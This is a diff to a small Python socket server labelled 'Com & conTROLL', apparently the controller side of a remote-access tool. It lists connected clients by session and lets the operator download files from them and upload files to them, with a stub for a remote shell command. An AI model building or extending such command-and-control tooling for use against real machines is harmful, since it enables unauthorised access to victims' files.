@@ -6,7 +6,7 @@ import time
 
 connections = []
 
-tprint("Server")
+tprint("Com & conTROLL")
 
 SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 5151
@@ -43,8 +43,11 @@ def use(session):
                 break                                           #
 #################################################################
             match command[0]:
-                case 'transfer':
-                    transfer(from_=command[1], where=command[2], session=session)
+                case  'download':
+                    download(from_=command[1], where=command[2], session=session)
+                case 'upload':
+                    upload(what=command[1], where=command[2], session=session)
+                
     else:
         print("ID does not exist!")
 
@@ -62,7 +65,7 @@ def listen_incoming():
         connection = {"address": address, 'socket': client_socket}
         connections.append(connection)
         
-def transfer(from_, where, session):
+def download(from_, where, session):
     socket = connections[session]['socket']
     socket.send(from_.encode())
     time.sleep(0.3)
@@ -78,6 +81,20 @@ def transfer(from_, where, session):
     file.close()
     print("File sent succesfully!")
 
+def upload(what, where, session):
+    socket = connections[session]['socket']
+    socket.send(where.encode())
+    time.sleep(0.3)
+    file_name = what.split('\\')[-1]
+    socket.send(file_name.encode())
+    file = open(what, 'rb')
+    a = file.read(4096)
+    while a:
+        socket.send(a)
+        a = file.read(4096)
+    time.sleep(0.3)
+    socket.send(b"\n\r")
+    file.close()
 
 threading.Thread(target=listen_incoming).start()
 
@@ -92,7 +109,7 @@ while 1:
             list()
         case "help":
             help()
-        case "transfer":
+        case  "download":
             pass
         case "shell":
             pass
